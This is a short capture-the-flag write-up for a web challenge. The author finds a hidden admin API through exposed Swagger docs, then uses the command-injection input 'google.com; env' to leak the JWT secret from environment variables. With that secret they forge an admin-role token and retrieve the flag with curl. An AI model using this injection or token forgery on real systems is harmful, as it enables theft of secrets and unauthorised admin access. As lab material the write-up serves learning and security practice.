# Vulnerability

1. The main vulnerability in this case is `jwt_secret` being exposed from env file using command injection. 
2. also swagger is exposed and helped me find an API which was not present in web page. 

# Extraction

In swagger page found this API: `https://ctf.seoeh.ir/admin/dashboard` which when I executed it using swagger interface got this response:
```
{
  "error": "forbidden"
}
```

So I thought it may be because of my role `user`.

I have already found the `jwt_secret` from env file using `google.com; env` command injection:
```
JWT_SECRET=<jwt-secret>
```

Using the jwt_secret I can create a new valid jwt token with modified `Payload`, so I can change the role of token to `admin` in `jwt.io`.


So I opened network tab and with sending another request extracted the `ctf-token` ( which is a jwt token ) from cookie:
```
cookie
csrftoken=9kvMs5e...; 
ctf_token=eyJhbGciO...
```
I pasted this jwt token into jwt.io and using the jwt_secret I changed the role in payload to admin.

Then called the API using the new ctf-token made in cookie:
```
curl -s 'https://ctf.seoeh.ir/admin/dashboard' -H 'Cookie: ctf_token=<CTF_TOKEN WITH ADMIN ROLE>'
```
and the flag appeared in response. 

# PoC

**Note:**

You should add your ctf_token (jwt_token) as an environment variable before running extract.sh. Get a normal token, use the leaked JWT_SECRET, change role to admin, and sign it again with HS256. then add it as an env variable like this :
```
export CTF_TOKEN=<CTF_TOKEN WITH ADMIN ROLE>
```

```
curl -s 'https://ctf.seoeh.ir/admin/dashboard' -H 'Cookie: ctf_token=<CTF_TOKEN>' | jq -r '.flag'
```